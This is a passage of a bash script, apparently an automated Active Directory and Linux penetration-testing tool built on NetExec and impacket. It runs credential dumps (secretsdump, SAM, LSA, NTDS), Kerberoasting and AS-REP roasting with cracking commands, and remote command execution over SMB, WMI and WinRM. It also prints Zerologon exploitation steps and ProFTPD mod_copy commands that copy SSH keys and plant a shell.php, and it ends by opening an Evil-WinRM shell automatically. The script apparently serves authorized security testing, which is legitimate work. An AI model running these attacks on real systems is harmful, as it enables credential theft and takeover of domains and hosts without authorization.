            echo "nxc smb $IP -u rpcuserlist.txt -p passwords.txt --no-bruteforce --continue-on-success"
            echo ""
            log_info "2. Password spraying with kerbrute:"
            if [ -n "$domain" ]; then
                echo "kerbrute passwordspray -d $domain --dc $IP rpcuserlist.txt 'Password123'"
                echo "kerbrute bruteuser -d $domain --dc $IP passwords.txt username"
                echo ""
                log_info "3. AS-REP roasting (no password needed):"
                echo "GetNPUsers.py $domain/ -usersfile rpcuserlist.txt -no-pass -dc-ip $IP"
                echo ""
                log_info "4. Validate usernames with kerbrute:"
                echo "kerbrute userenum -d $domain --dc $IP rpcuserlist.txt"
            else
                echo "kerbrute passwordspray -d DOMAIN --dc $IP rpcuserlist.txt 'Password123'"
                echo ""
                log_info "3. AS-REP roasting (no password needed):"
                echo "GetNPUsers.py DOMAIN/ -usersfile rpcuserlist.txt -no-pass -dc-ip $IP"
                echo ""
                log_info "Note: Specify domain with -d flag for kerbrute commands"
            fi
            echo ""
        fi
        
        # secretsdump requires actual credentials
        if [ -n "$pass" ] || [ -n "$hash" ]; then
            log_section "RPC Secrets Dump"
            print_cmd "impacket-secretsdump $SECRETS_ARG"
            impacket-secretsdump $SECRETS_ARG 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt
            if [ ! -s nxc-enum/smb/rpc-secretsdump.txt ]; then
                print_cmd "secretsdump.py $SECRETS_ARG"
                secretsdump.py $SECRETS_ARG 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt
            fi
        else
            log_warning "Skipping RPC Secrets Dump (requires password/hash)"
        fi
    else
        log_warning "Skipping RPC Enumeration (no username supplied)"
    fi
    
    log_section "RPC Endpoint Dump"
    timestamp=$(date +%Y%m%d_%H%M%S)
    print_cmd "impacket-rpcdump \"$IP\" $RPCDUMP_ARG"
    impacket-rpcdump "$IP" $RPCDUMP_ARG 2>/dev/null > "nxc-enum/rpc_endpoints_${timestamp}.txt"
    if [ ! -s "nxc-enum/rpc_endpoints_${timestamp}.txt" ]; then
        print_cmd "rpcdump.py \"$IP\" $RPCDUMP_ARG"
        rpcdump.py "$IP" $RPCDUMP_ARG 2>/dev/null > "nxc-enum/rpc_endpoints_${timestamp}.txt"
    fi
    log_info "Results saved to: ${BWHITE}nxc-enum/rpc_endpoints_${timestamp}.txt${NC}"
    
    if [ -n "$user" ]; then
        if check_port $IP 5985 || check_port $IP 5986; then
            log_section "WinRM Enumeration"
            log_info "WinRM Credentials Check"
            check_and_suggest winrm nxc winrm $IP $DOMAIN_FLAG $USER_FLAG --continue-on-success --timeout 120 --http-timeout 120 | tee nxc-enum/smb/winrm-credentials.txt
        
            log_info "WinRM Command Execution (whoami)"
            print_cmd "nxc winrm $IP $DOMAIN_FLAG $USER_FLAG --timeout 120 --http-timeout 120 -x whoami"
            unbuffer nxc winrm $IP $DOMAIN_FLAG $USER_FLAG --timeout 120 --http-timeout 120 -x whoami | tee nxc-enum/smb/winrm-whoami.txt
        else
            log_warning "Skipping WinRM check (Ports 5985/5986 closed)"
        fi
    else
        log_warning "Skipping WinRM Enumeration (no username supplied)"
    fi
    
    # Redundant share listing removed (already checked in validation)
    # User enumeration removed (already done in initial LDAP domain SID check at line ~100)
    
    if [ -n "$user" ]; then
        log_section "Logged On Users"
        print_cmd "nxc smb $IP $USER_FLAG --loggedon-users"
        unbuffer nxc smb $IP $USER_FLAG --loggedon-users 2>/dev/null | tee nxc-enum/smb/logged-users.txt
    
        log_section "Admin User Count"
        print_cmd "nxc ldap $IP $USER_FLAG --users --admin-count"
        unbuffer nxc ldap $IP $USER_FLAG --users --admin-count 2>/dev/null | tee nxc-enum/ldap/admin-count-users.txt
    
        log_section "RID Brute Force"
        print_cmd "nxc smb $IP $USER_FLAG --rid-brute"
        unbuffer nxc smb $IP $USER_FLAG --rid-brute 2>/dev/null | tee nxc-enum/smb/rid-bruteforce.txt
    
        log_section "Domain Groups"
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --groups"
        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --groups 2>/dev/null | tee nxc-enum/smb/domain-groups.txt
    
        log_section "Local Groups"
        print_cmd "nxc smb $IP $USER_FLAG --local-groups"
        unbuffer nxc smb $IP $USER_FLAG --local-groups 2>/dev/null | tee nxc-enum/smb/local-groups.txt
    
        log_section "Password Policy"
        print_cmd "nxc smb $IP $USER_FLAG --pass-pol"
        unbuffer nxc smb $IP $USER_FLAG --pass-pol 2>/dev/null | tee nxc-enum/smb/pw-policy.txt
    
        log_section "Remote Command Execution (whoami)"
        print_cmd "nxc smb $IP $USER_FLAG -x whoami"
        nxc smb $IP $USER_FLAG -x whoami 2>/dev/null
        print_cmd "nxc smb $IP $USER_FLAG -X '\$PSVersionTable'"
        nxc smb $IP $USER_FLAG -X '$PSVersionTable' 2>/dev/null
        print_cmd "nxc wmi $IP $USER_FLAG -x whoami"
        nxc wmi $IP $USER_FLAG -x whoami 2>/dev/null
        print_cmd "nxc winrm $IP $USER_FLAG -x whoami"
        nxc winrm $IP $USER_FLAG -x whoami 2>/dev/null
    else
        log_warning "Skipping User/Group Enumeration & Command Execution (no username supplied)"
    fi
    
    # LDAP modules require actual authentication - skip if no password/hash
    if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
        log_section "GMSA Passwords"
        print_cmd "nxc ldap $IP $USER_FLAG --users --gmsa"
        unbuffer nxc ldap $IP $USER_FLAG --users --gmsa 2>/dev/null | tee nxc-enum/ldap/gmsa.txt  
    
        log_section "Anti-Virus Check"
        print_cmd "nxc smb $IP $USER_FLAG -M enum_av"
        unbuffer nxc smb $IP $USER_FLAG -M enum_av 2>/dev/null | tee nxc-enum/ldap/anti_virus.txt  
    
        log_section "LDAP Module Enumeration"

        log_info "Running ldapdomaindump"
        mkdir -p nxc-enum/ldap/ldd
        
        if [ -n "$domain" ]; then
            ldd_user="$domain\\$user"
        else
            ldd_user="$user"
        fi
        
        if [ -n "$pass" ]; then
            print_cmd "ldapdomaindump -u \"$ldd_user\" -p \"$pass\" -o nxc-enum/ldap/ldd ldap://$IP"
            unbuffer ldapdomaindump -u "$ldd_user" -p "$pass" -o nxc-enum/ldap/ldd ldap://$IP | tee nxc-enum/ldap/ldapdomaindump.log
        elif [ -n "$hash" ]; then
            print_cmd "ldapdomaindump -u \"$ldd_user\" -p \"$hash\" -o nxc-enum/ldap/ldd ldap://$IP"
            unbuffer ldapdomaindump -u "$ldd_user" -p "$hash" -o nxc-enum/ldap/ldd ldap://$IP | tee nxc-enum/ldap/ldapdomaindump.log
        fi

        if [ -f nxc-enum/ldap/ldd/index.html ]; then
             log_success "ldapdomaindump report saved to: ${BWHITE}nxc-enum/ldap/ldd/index.html${NC}"
        fi
    
        log_info "Machine Account Quota (maq)"
        print_cmd "nxc ldap $IP $USER_FLAG --users -M maq"
        unbuffer nxc ldap $IP $USER_FLAG --users -M maq 2>/dev/null | tee nxc-enum/ldap/maq.txt
    
        log_info "ADCS Templates"
        print_cmd "nxc ldap $IP $USER_FLAG --users -M adcs"
        unbuffer nxc ldap $IP $USER_FLAG --users -M adcs 2>/dev/null | tee nxc-enum/ldap/adcs.txt
    
        log_info "User Descriptions"
        print_cmd "nxc ldap $IP $USER_FLAG --users -M get-desc-users"
        unbuffer nxc ldap $IP $USER_FLAG --users -M get-desc-users 2>/dev/null | tee nxc-enum/ldap/desc-users.txt
    
        log_info "LDAP Checker"
        print_cmd "nxc ldap $IP $USER_FLAG --users -M ldap-checker"
        unbuffer nxc ldap $IP $USER_FLAG --users -M ldap-checker 2>/dev/null | tee nxc-enum/ldap/ldap-checker.txt
    
        log_info "Password Not Required"
        print_cmd "nxc ldap $IP $USER_FLAG --users --password-not-required"
        unbuffer nxc ldap $IP $USER_FLAG --users --password-not-required 2>/dev/null | tee nxc-enum/ldap/password-not-required.txt
    
        log_info "Trusted For Delegation"
        print_cmd "nxc ldap $IP $USER_FLAG --users --trusted-for-delegation"
        unbuffer nxc ldap $IP $USER_FLAG --users --trusted-for-delegation 2>/dev/null | tee nxc-enum/ldap/trusted-for-delegation.txt
    
        log_section "AD CS Enumeration (Certipy)"
        # Check if certipy is in PATH, if not check distinct location
        CERTIPY_CMD="certipy"
        if ! command -v certipy &> /dev/null; then
             if [ -f "$HOME/.local/bin/certipy" ]; then
                 CERTIPY_CMD="$HOME/.local/bin/certipy"
             elif [ -f "/home/noah/.local/bin/certipy" ]; then
                 CERTIPY_CMD="/home/noah/.local/bin/certipy"
             elif [ -f "/usr/local/bin/certipy" ]; then
                 CERTIPY_CMD="/usr/local/bin/certipy"
             fi
        fi

        if command -v "$CERTIPY_CMD" &> /dev/null || [ -f "$CERTIPY_CMD" ]; then
             log_info "Running Certipy find..."
             # Construct Certipy command with user@domain if available (more reliable)
             certipy_run_cmd="$CERTIPY_CMD find"
             if [ -n "$domain" ]; then
                 certipy_run_cmd="$certipy_run_cmd -u '$user@$domain' -p '$pass' -target '$domain'"
             else
                 certipy_run_cmd="$certipy_run_cmd -u '$user' -p '$pass' -target '$IP'"
             fi
             
             # Run certipy find
             print_cmd "$certipy_run_cmd -dc-ip $IP -vulnerable -enabled -stdout"
             eval "$certipy_run_cmd -dc-ip $IP -vulnerable -enabled -stdout 2>/dev/null" | tee nxc-enum/ldap/certipy_output.txt
             
             if [ -s nxc-enum/ldap/certipy_output.txt ]; then
                 log_success "Certipy scan complete! Results saved to ${BWHITE}nxc-enum/ldap/certipy_output.txt${NC}"
                 log_info "Checking for vulnerable templates..."
                 grep -iE "ESC[0-9]" nxc-enum/ldap/certipy_output.txt || log_info "No obvious ESC vulnerabilities found in text output."
                 echo ""
                 log_info "View full report:"
                 echo "cat nxc-enum/ldap/certipy_output.txt"
             else
                 log_warning "Certipy run failed or no output generated."
             fi
        else
             log_warning "Certipy not found (checked PATH and ~/.local/bin). Skipping AD CS check."
             log_info "Install with: pipx install certipy-ad"
        fi

        log_section "Kerberoasting"
        rm -f nxc-enum/ldap/kerberoasting.txt kerberoasting.txt 2>/dev/null
        print_cmd "nxc ldap $IP $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt"
        unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt 2>/dev/null
        if [ -s nxc-enum/ldap/kerberoasting.txt ] && grep -q 'krb5tgs' nxc-enum/ldap/kerberoasting.txt 2>/dev/null; then
            cp nxc-enum/ldap/kerberoasting.txt ./kerberoasting.txt
            log_success "Kerberoast hashes found! Saved to ${BWHITE}kerberoasting.txt${NC}"
            log_info "Suggested cracking commands:"
            
            # Detect hash type and suggest correct mode
            if grep -q 'krb5tgs\$23\$' kerberoasting.txt 2>/dev/null; then
                log_info "etype 23 (RC4-HMAC) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
                echo "hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            if grep -q 'krb5tgs\$17\$' kerberoasting.txt 2>/dev/null; then
                log_info "etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
                echo "hashcat -m 19600 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            if grep -q 'krb5tgs\$18\$' kerberoasting.txt 2>/dev/null; then
                log_info "etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
                echo "hashcat -m 19700 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            echo ""
        fi
    
        log_section "AS-REProasting (LDAP)"
        rm -f nxc-enum/ldap/asreproasting.txt asreproasting.txt 2>/dev/null
        print_cmd "nxc ldap $IP $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt"
        unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt 2>/dev/null
        if [ -s nxc-enum/ldap/asreproasting.txt ] && grep -q 'krb5asrep' nxc-enum/ldap/asreproasting.txt 2>/dev/null; then
            cp nxc-enum/ldap/asreproasting.txt ./asreproasting.txt
            log_success "AS-REP hashes found! Saved to ${BWHITE}asreproasting.txt${NC}"
            log_info "Suggested cracking commands:"
            
            # Detect hash type and suggest correct mode
            if grep -q 'krb5asrep\$23\$' asreproasting.txt 2>/dev/null; then
                log_info "etype 23 (RC4-HMAC) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
                echo "hashcat -m 18200 asreproasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            if grep -q 'krb5asrep\$17\$' asreproasting.txt 2>/dev/null; then
                log_info "etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
                echo "hashcat -m 19800 asreproasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            if grep -q 'krb5asrep\$18\$' asreproasting.txt 2>/dev/null; then
                log_info "etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
                echo "hashcat -m 19900 asreproasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            echo ""
        fi
        
        log_section "BloodHound Data Collection"
        log_info "Collecting all data (-c all)..."
        print_cmd "nxc ldap $IP $USER_FLAG --bloodhound -c all --dns-server $IP"
        bh_output=$(unbuffer nxc ldap $IP $USER_FLAG --bloodhound -c all --dns-server $IP 2>&1 | tee nxc-enum/ldap/bloodhound-collection.txt)
        echo "$bh_output"
        
        # Extract zip filename and suggest next steps
        zip_file=$(echo "$bh_output" | grep "Compressing output into" | awk '{print $NF}')
        if [ -n "$zip_file" ]; then
             log_success "BloodHound data saved to: ${BWHITE}$zip_file${NC}"
             log_info "1. Run 'neo4j start' and open 'bloodhound'"
             log_info "2. Drag and drop the zip file into BloodHound to analyze."
        fi
    else
        log_warning "Skipping LDAP Module Enumeration & Roasting (requires username AND password/hash)"
    fi
    
    if [ -n "$user" ]; then
        log_section "Domain Controllers"
        print_cmd "nxc ldap $IP $USER_FLAG --dc-list"
        unbuffer nxc ldap $IP $USER_FLAG --dc-list | tee nxc-enum/ldap/domain-controllers.txt
    
        log_section "SMB Module Enumeration"
    
        log_info "Spider Plus (Find Interesting Files)"
        print_cmd "nxc smb $IP $USER_FLAG -M spider_plus --timeout 30"
        timeout 60s unbuffer nxc smb $IP $USER_FLAG -M spider_plus --timeout 30 | tee nxc-enum/smb/spider-plus.txt
        
        # Copy spider_plus JSON findings to workspace
        if [ -d "$HOME/.nxc/modules/nxc_spider_plus" ]; then
             cp -r "$HOME/.nxc/modules/nxc_spider_plus" nxc-enum/smb/ 2>/dev/null
        fi
        # Also check root path just in case
        if [ -d "/root/.nxc/modules/nxc_spider_plus" ] && [ "$(id -u)" -eq 0 ]; then
             cp -r "/root/.nxc/modules/nxc_spider_plus" nxc-enum/smb/ 2>/dev/null
        else
             # Try sudo copy if we can't read it
             sudo cp -r "/root/.nxc/modules/nxc_spider_plus" nxc-enum/smb/ 2>/dev/null
        fi
        
        if [ -d "nxc-enum/smb/nxc_spider_plus" ]; then
            log_success "Spider Plus JSON results copied to: ${BWHITE}nxc-enum/smb/nxc_spider_plus/${NC}"
        fi
    
        log_info "Check Zerologon Vulnerability"
        print_cmd "nxc smb $IP $USER_FLAG -M zerologon --timeout 5"
        zerologon_output=$(timeout 30s unbuffer nxc smb $IP $USER_FLAG -M zerologon --timeout 5 | tee nxc-enum/smb/zerologon.txt)
        echo "$zerologon_output"
        
        # Check if Zerologon vulnerability was found
        if echo "$zerologon_output" | grep -qi "VULNERABLE\|Exploit\|SUCCESS"; then
            log_error "CRITICAL: Zerologon vulnerability detected!"
            log_warning "WARNING: Exploiting Zerologon will break the domain! Only use in authorized testing."
            log_success "Suggested exploitation steps:"
            
            # Extract DC name if possible
            dc_name=$(echo "$zerologon_output" | grep -oP 'name:\K[^\)]+' | head -n1 | tr -d ' ')
            if [ -z "$dc_name" ]; then
                dc_name="DC_NAME"
            fi
            
            log_info "1. Exploit Zerologon to reset DC machine account password:"
            echo "python3 /usr/share/doc/python3-impacket/examples/zerologon_tester.py $dc_name $IP"
            echo ""
            log_info "2. Dump credentials using the zeroed password:"
            echo "impacket-secretsdump -no-pass $dc_name\$@$IP"
            echo ""
            log_info "3. IMPORTANT: Restore the original password using the hex key from secretsdump:"
            echo "python3 /path/to/restorepassword.py $dc_name $IP -hexpass <HEX_PASSWORD_FROM_SECRETSDUMP>"
            echo ""
            log_error "CRITICAL: You MUST restore the password or the domain will be broken!"
            echo ""
        fi
    
        log_section "MSSQL Enumeration"
    
        if check_port $IP 1433 "MSSQL"; then
            log_info "MSSQL Info"
            print_cmd "nxc mssql $IP $USER_FLAG"
            unbuffer nxc mssql $IP $USER_FLAG | tee nxc-enum/smb/mssql-info.txt
        
            log_info "MSSQL Query (xp_dirtree)"
            print_cmd "nxc mssql $IP $USER_FLAG -x 'EXEC xp_dirtree \"C:\\\\\", 1;'"
            unbuffer nxc mssql $IP $USER_FLAG -x 'EXEC xp_dirtree "C:\\", 1;' | tee nxc-enum/smb/mssql-xp-dirtree.txt
        
            log_info "MSSQL Query (sp_databases)"
            print_cmd "nxc mssql $IP $USER_FLAG -x 'EXEC sp_databases;'"
            unbuffer nxc mssql $IP $USER_FLAG -x 'EXEC sp_databases;' | tee nxc-enum/smb/mssql-databases.txt
        fi
        
        log_section "VNC Enumeration"
    
        log_info "VNC Credentials Check"
        # VNC doesn't support hash authentication, only password
        if [ -n "$pass" ]; then
            print_cmd "nxc vnc $IP -u \"$user\" -p \"$pass\""
            timeout 5s unbuffer nxc vnc $IP -u "$user" -p "$pass" | tee nxc-enum/smb/vnc-credentials.txt
        else
            log_warning "Skipping VNC check (VNC requires password, not hash)"
        fi
    
        log_section "WMI Enumeration"
    
        log_info "WMI Credentials Check"
        # WMI uses RPC (135) and dynamic ports. We check 135.
        if check_port $IP 135 "WMI (RPC)"; then
             check_and_suggest wmi nxc wmi $IP $USER_FLAG | tee nxc-enum/smb/wmi-credentials.txt
    
             log_info "WMI Command Execution (whoami)"
             print_cmd "nxc wmi $IP $USER_FLAG -x whoami"
             unbuffer nxc wmi $IP $USER_FLAG -x whoami | tee nxc-enum/smb/wmi-whoami.txt
        else
             log_warning "Skipping WMI check (Port 135 closed)"
        fi
    
            log_section "SMB Additional Enumeration"
    
        log_info "SAM Hashes Dump"
        print_cmd "nxc smb $IP $USER_FLAG --sam"
        unbuffer nxc smb $IP $USER_FLAG --sam | tee nxc-enum/smb/sam-hashes.txt
    
        log_info "LSA Secrets Dump"
        print_cmd "nxc smb $IP $USER_FLAG --lsa"
        unbuffer nxc smb $IP $USER_FLAG --lsa | tee nxc-enum/smb/lsa-secrets.txt

        # enum4linux-ng Authenticated Scan
        if command -v enum4linux-ng &> /dev/null; then
            log_info "Running enum4linux-ng (Authenticated - MAX INFO)"
            echo "    Running with -A (All), -R (RID Cycle), -d (Detailed)"
            if [ -n "$hash" ]; then
                print_cmd "enum4linux-ng -u \"$user\" -H \"$hash\" -A -R -d $IP"
                timeout 600s enum4linux-ng -u "$user" -H "$hash" -A -R -d $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-ng-auth.txt
            elif [ -n "$pass" ]; then
                print_cmd "enum4linux-ng -u \"$user\" -p \"$pass\" -A -R -d $IP"
                timeout 600s enum4linux-ng -u "$user" -p "$pass" -A -R -d $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-ng-auth.txt
            fi
        fi
    else
        log_warning "Skipping Additional Windows Enumeration (no username supplied)"
    fi
else
    log_warning "Skipping Windows-specific enumeration (target OS: Linux)"
    log_info "Linux enumeration mode - focusing on SSH, FTP, and SMB (Samba)"
fi

# SSH and FTP enumeration (works for both Windows and Linux)
if [ -n "$user" ]; then
    log_section "SSH Enumeration"
    
    log_info "SSH Credentials Check"
    # SSH doesn't support hash authentication
    if [ -n "$pass" ]; then
        if check_port $IP 22 "SSH"; then
            print_cmd "nxc ssh $IP -u \"$user\" -p \"$pass\""
            ssh_output=$(unbuffer nxc ssh $IP -u "$user" -p "$pass" | tee nxc-enum/smb/ssh-credentials.txt)
            echo "$ssh_output"
            
            # Check if SSH access was successful and suggest connection
            if echo "$ssh_output" | grep -q "\[+\].*Shell access"; then
                log_success "SSH access successful! Connect with:"
                echo "ssh -o StrictHostKeyChecking=no $user@$IP"
                echo ""
                log_info "Or with password in command (less secure):"
                echo "sshpass -p '$pass' ssh -o StrictHostKeyChecking=no $user@$IP"
                echo ""
                log_info "Copy files from remote:"
                echo "scp -o StrictHostKeyChecking=no $user@$IP:/path/to/file ."
                echo ""
                log_info "Copy files to remote:"
                echo "scp -o StrictHostKeyChecking=no localfile $user@$IP:/path/to/destination"
                echo ""
            fi
        fi
    else
        log_warning "Skipping SSH check (SSH requires password, not hash)"
    fi

    log_info "SSH Command Execution (whoami)"
    if [ -n "$pass" ]; then
        if check_port $IP 22; then
            print_cmd "nxc ssh $IP -u \"$user\" -p \"$pass\" -x \"whoami\""
            unbuffer nxc ssh $IP -u "$user" -p "$pass" -x "whoami" | tee nxc-enum/smb/ssh-whoami.txt
        fi
    else
        log_warning "Skipping (SSH requires password)"
    fi
    
    log_section "FTP Enumeration"
    
    log_info "FTP Credentials Check"
    # FTP doesn't support hash authentication
    if [ -n "$pass" ]; then
        if check_port $IP 21 "FTP"; then
            print_cmd "nxc ftp $IP -u \"$user\" -p \"$pass\""
            timeout 5s unbuffer nxc ftp $IP -u "$user" -p "$pass" | tee nxc-enum/smb/ftp-credentials.txt
            
            # Suggest manual FTP/NC connection
            log_info "Manual FTP connection:"
            echo "ftp ftp://$user:$pass@$IP"
            echo "nc -nv $IP 21"
            echo ""
        fi
    else
        log_warning "Skipping FTP check (FTP requires password, not hash)"
    fi
    
    log_info "FTP Share Enumeration"
    if [ -n "$pass" ]; then
        if check_port $IP 21; then
            print_cmd "nxc ftp $IP -u \"$user\" -p \"$pass\" --ls"
            timeout 5s unbuffer nxc ftp $IP -u "$user" -p "$pass" --ls | tee nxc-enum/smb/ftp-shares.txt
        fi
    else
        log_warning "Skipping (FTP requires password)"
    fi
else
    log_warning "Skipping SSH/FTP Enumeration (no username supplied)"
fi

# FTP Unauthenticated / Banner Grab (Check for ProFTPD Exploit)
log_section "FTP Banner Grab & Exploit Check"
if check_port $IP 21; then
    log_success "FTP port 21 is OPEN!"

    # Grab banner
    log_info "FTP Banner:"
    print_cmd "nc -nv $IP 21"
    ftp_banner=$(timeout 5 nc -nv $IP 21 2>/dev/null)
    echo "$ftp_banner"

    # Check for ProFTPD mod_copy exploit (CVE-2015-3306)
    # This specifically looks for ProFTPD which affects versions <= 1.3.5
    if echo "$ftp_banner" | grep -qi "ProFTPD"; then
        log_error "ProFTPD detected! Possible mod_copy vulnerability (CVE-2015-3306)"

        # Determine target user for the path
        target_user="kenobi" # Fallback default

        # 1. Use manual argument if provided
        if [ -n "$user" ]; then
            target_user="$user"
        else
            # 2. Try to find a user from enumeration (lookupsid/rpc)
            # Find the most recent users file from the 'users_*.txt' pattern
            users_file=$(ls -t nxc-enum/smb/users_*.txt 2>/dev/null | head -n1)

            if [ -f "$users_file" ] && [ -s "$users_file" ]; then
                # Get first user from the file
                found_user=$(head -n 1 "$users_file")
                if [ -n "$found_user" ]; then
                     target_user="$found_user"
                fi
            fi
        fi

        log_info "Try manual exploitation with nc (copy files without auth):"
        echo "nc $IP 21"
        echo "SITE CPFR /home/$target_user/.ssh/id_rsa"
        echo "SITE CPTO /var/tmp/id_rsa"
        echo "SITE CPFR /var/www/html/index.php"
        echo "SITE CPTO /var/www/html/shell.php"
        echo ""
    fi

    log_info "Manual connection:"
    echo "nc -nv $IP 21"
    echo ""
else
    log_warning "FTP (Port 21) seems closed."
fi

# Telnet Enumeration (using available tool checking)
log_section "Telnet Enumeration"
if check_port $IP 23; then
    log_success "Telnet port 23 is OPEN!"
    log_info "Suggested connection commands:"
    echo "telnet -l $user $IP"
    echo "nc -nv $IP 23"
    echo ""
    log_info "Banner grab:"
    print_cmd "nc -nv $IP 23"
    timeout 5 nc -nv $IP 23
    echo ""
else
    log_warning "Telnet (Port 23) seems closed."
    log_info "If you believe this is an error, try manually:"
    echo "    nc -nv $IP 23"
fi

# Advanced DACL enumeration (requires credentials)
if [ "$os_type" = "windows" ] && [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
    log_section "Advanced DACL Enumeration"

    log_info "Administrator's ACE"
    print_cmd "nxc ldap $IP $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read"
    unbuffer nxc ldap $IP $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read 2>/dev/null | tee nxc-enum/ldap/admin-ace.txt

    # Build domain DN from domain name
    if [ -n "$domain" ]; then
        # Convert domain.local to DC=domain,DC=local
        domain_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')

        log_info "DCSync Rights"
        print_cmd "nxc ldap $IP $USER_FLAG -M daclread -o TARGET_DN=\"$domain_dn\" ACTION=read RIGHTS=DCSync"
        unbuffer nxc ldap $IP $USER_FLAG -M daclread -o TARGET_DN="$domain_dn" ACTION=read RIGHTS=DCSync 2>/dev/null | tee nxc-enum/ldap/dcsync-rights.txt

        log_info "What these checks reveal:"
        echo "  - Administrator ACE: Shows who can modify the Administrator account"
        echo "  - DCSync Rights: Shows who can dump domain credentials (critical finding!)"
        echo ""
    else
        log_warning "Skipping DCSync rights check (no domain name provided)"
    fi
fi

# NTDS Dump - Run at the very end since it can crash the DC
if [ "$os_type" = "windows" ] && [ -n "$user" ]; then
    log_section "FINAL CHECK: NTDS Database Dump"

    log_warning "NTDS dump can crash DC on Windows Server 2019!"
    log_warning "This is run LAST to avoid interrupting other enumeration."
    log_info "Alternative: impacket-secretsdump was already run above (safer)"
    echo ""

    log_info "Proceed with NTDS dump? [y/N]"
    read -t 10 -n 1 response
    echo ""

    if [[ "$response" =~ ^[Yy]$ ]]; then
        log_warning "Running NTDS Dump..."
        print_cmd "nxc smb $IP $USER_FLAG --ntds"
        unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
    else
        log_info "NTDS dump skipped (timed out or declined)"
        log_info "To run manually: ${BWHITE}nxc smb $IP $USER_FLAG --ntds${NC}"
    fi
fi

echo -e "\n${BGREEN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
log_success "Enumeration Complete!"
log_info "Results saved to: ${BWHITE}$(pwd)/nxc-enum/${NC}"
echo -e "${BGREEN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

# Final step: Automated Evil-WinRM shell if credentials are valid
if [ "$os_type" = "windows" ] && { check_port $IP 5985 || check_port $IP 5986; }; then
    log_section "AUTOMATED SHELL: Evil-WinRM"

    # Check if we already found valid WinRM creds in the log file
    if grep -qi "WINRM" "$VALID_CREDS_FILE" 2>/dev/null; then
        log_success "Valid WinRM credentials detected! Launching shell..."
        log_cmd "evil-winrm $WINRM_CREDS"
        echo ""
        evil-winrm $WINRM_CREDS
    elif [ -n "$user" ] && [ -n "$pass" ]; then
        # If not explicitly in the valid log, try one last validation check for the current user/pass
        log_info "No verified WinRM credentials in logs. Waiting 5s for target to breathe..."
        sleep 5
        log_info "Checking current credentials one last time..."

        # Build command based on local auth preference with longer timeouts
        if [ "$USE_LOCAL_AUTH" = "true" ]; then
            val_out=$(nxc winrm $IP $USER_FLAG --local-auth --timeout 120 --http-timeout 120 2>/dev/null)
        else
            val_out=$(nxc winrm $IP $DOMAIN_FLAG $USER_FLAG --timeout 120 --http-timeout 120 2>/dev/null)
        fi

        if echo "$val_out" | grep -q "+"; then
            log_success "Success! Launching shell..."
            evil-winrm $WINRM_CREDS
        else
            log_error "Error: Username or password are wrong for WinRM access on $IP"
            log_warning "(Note: Also possible that WinRM timed out - increased limit to 120s)"
        fi
    else
        log_warning "WinRM is open, but no valid credentials were provided or discovered."
    fi
fi